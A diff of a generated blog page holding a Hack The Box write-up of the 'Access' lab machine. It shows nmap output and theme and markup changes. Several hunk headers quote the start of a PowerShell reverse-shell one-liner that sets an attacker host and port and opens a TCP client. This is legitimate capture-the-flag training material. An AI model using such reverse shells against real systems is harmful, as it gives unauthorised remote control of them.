@@ -62,7 +62,7 @@ User Flag
 The port scan shows that anonymous login to the FTP server on standard port 21 is allowed. This means we can login by providing the name anonymous and any password.">
 <meta name="author" content="Fabio Birnegger">
 <link rel="canonical" href="http://localhost:1313/writeups/htb_access/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.9b4f18f427ed299296009b0f14c130159f761d9d285109ab0e5db09488a51e86.css" integrity="sha256-m08Y9CftKZKWAJsPFMEwFZ92HZ0oUQmrDl2wlIilHoY=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b255db539a50b81cdf98f8e589f90be96d438cc741249f7e8f6510cff8a616fd.css" integrity="sha256-slXbU5pQuBzfmPjlifkL6W1DjMdBJJ9&#43;j2UQz/imFv0=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -91,7 +91,7 @@ The port scan shows that anonymous login to the FTP server on standard port 21 i
   <meta property="og:description" content="Box Details
 Difficulty Easy Type Windows Port Scan
 └─$ nmap -sV -sC 10.129.34.220Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-11 15:39 &#43;0200Nmap scan report for 10.129.34.220Host is up (0.040s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-syst: |_ SYST: Windows_NT| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.23/tcp open telnet Microsoft Windows XP telnetd| telnet-ntlm-info: | Target_Name: ACCESS| NetBIOS_Domain_Name: ACCESS| NetBIOS_Computer_Name: ACCESS| DNS_Domain_Name: ACCESS| DNS_Computer_Name: ACCESS|_ Product_Version: 6.1.760080/tcp open http Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5|_http-title: MegaCorp| http-methods: |_ Potentially risky methods: TRACEService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: 2sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds User Flag The port scan shows that anonymous login to the FTP server on standard port 21 is allowed. This means we can login by providing the name anonymous and any password.">
-  <meta property="og:locale" content="en-us">
+  <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2026-05-11T00:00:00+00:00">
@@ -102,60 +102,10 @@ Difficulty Easy Type Windows Port Scan
     <meta property="og:image" content="http://localhost:1313/writeups/htb_access/images/writeup_screens/htb_access/htb_access_cover.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://localhost:1313/writeups/htb_access/images/writeup_screens/htb_access/htb_access_cover.png">
-<meta name="twitter:title" content="HTB - Access">
-<meta name="twitter:description" content="Box Details
-
-  
-      
-          
-          
-      
-  
-  
-      
-          Difficulty
-          Easy
-      
-      
-          Type
-          Windows
-      
-  
-
-Port Scan
-└─$ nmap -sV -sC 10.129.34.220
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-11 15:39 &#43;0200
-Nmap scan report for 10.129.34.220
-Host is up (0.040s latency).
-Not shown: 997 filtered tcp ports (no-response)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     Microsoft ftpd
-| ftp-syst: 
-|_  SYST: Windows_NT
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.
-23/tcp open  telnet  Microsoft Windows XP telnetd
-| telnet-ntlm-info: 
-|   Target_Name: ACCESS
-|   NetBIOS_Domain_Name: ACCESS
-|   NetBIOS_Computer_Name: ACCESS
-|   DNS_Domain_Name: ACCESS
-|   DNS_Computer_Name: ACCESS
-|_  Product_Version: 6.1.7600
-80/tcp open  http    Microsoft IIS httpd 7.5
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: MegaCorp
-| http-methods: 
-|_  Potentially risky methods: TRACE
-Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
-
-Host script results:
-|_clock-skew: 2s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
-User Flag
-The port scan shows that anonymous login to the FTP server on standard port 21 is allowed. This means we can login by providing the name anonymous and any password.">
+  <meta name="twitter:title" content="HTB - Access">
+  <meta name="twitter:description" content="Box Details
+Difficulty Easy Type Windows Port Scan
+└─$ nmap -sV -sC 10.129.34.220Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-11 15:39 &#43;0200Nmap scan report for 10.129.34.220Host is up (0.040s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-syst: |_ SYST: Windows_NT| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.23/tcp open telnet Microsoft Windows XP telnetd| telnet-ntlm-info: | Target_Name: ACCESS| NetBIOS_Domain_Name: ACCESS| NetBIOS_Computer_Name: ACCESS| DNS_Domain_Name: ACCESS| DNS_Computer_Name: ACCESS|_ Product_Version: 6.1.760080/tcp open http Microsoft IIS httpd 7.5|_http-server-header: Microsoft-IIS/7.5|_http-title: MegaCorp| http-methods: |_ Potentially risky methods: TRACEService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: 2sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds User Flag The port scan shows that anonymous login to the FTP server on standard port 21 is allowed. This means we can login by providing the name anonymous and any password.">
 
 
 <script type="application/ld+json">
@@ -214,17 +164,17 @@ The port scan shows that anonymous login to the FTP server on standard port 21 i
 </head>
 <body id="top">
     <header class="header">
-    <nav class="nav">
+    <nav class="header-nav">
         <div class="logo">
             <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
                         <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                     </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
                         <circle cx="12" cy="12" r="5"></circle>
@@ -240,7 +190,7 @@ The port scan shows that anonymous login to the FTP server on standard port 21 i
                 </button>
             </div>
         </div>
-        <ul id="menu">
+        <ul id="menu" class="menu">
             <li>
                 <a href="http://localhost:1313/writeups/" title="Write-ups">
                     <span>Write-ups</span>
@@ -267,7 +217,9 @@ The port scan shows that anonymous login to the FTP server on standard port 21 i
     <h1 class="post-title entry-hint-parent">
       HTB - Access
     </h1>
-    <div class="post-meta"><span title='2026-05-11 00:00:00 +0000 UTC'>May 11, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+    <div class="post-meta">
+
+<span title='2026-05-11 00:00:00 +0000 UTC'>May 11, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
 
 </div>
   </header> 
@@ -275,7 +227,7 @@ The port scan shows that anonymous login to the FTP server on standard port 21 i
         <img loading="eager" src="http://localhost:1313/images/writeup_screens/htb_access/htb_access_cover.png" alt="HTB Access Cover">
         
 </figure>
-  <div class="post-content"><p><strong>Box Details</strong></p>
+  <div class="post-content md-content"><p><strong>Box Details</strong></p>
 <table>
   <thead>
       <tr>
@@ -367,9 +319,12 @@ $LHOST = &#34;10.10.16.239&#34;; $LPORT = 21; $TCPClient = New-Object Net.Socket
       <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
     </ul>
 <nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/pg_nibbles/">
+    <span class="title">« Prev</span>
+    <span>PG Practice - Nibbles</span>
+  </a>
   <a class="next" href="http://localhost:1313/writeups/htb_heist/">
     <span class="title">Next »</span>
-    <br>
     <span>HTB - Heist</span>
   </a>
 </nav>
@@ -381,15 +336,19 @@ $LHOST = &#34;10.10.16.239&#34;; $LPORT = 21; $TCPClient = New-Object Net.Socket
 <footer class="footer">
         <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
 
+    
+    
     <span>
         Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
         <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
     </span>
 </footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
     </svg>
 </a>
 
@@ -428,14 +387,13 @@ $LHOST = &#34;10.10.16.239&#34;; $LPORT = 21; $TCPClient = New-Object Net.Socket
 
 </script>
 <script>
-    var mybutton = document.getElementById("top-link");
+    var toplink = document.getElementById("top-link");
     window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
         } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
+            toplink.classList.add("hidden");
         }
     };
 
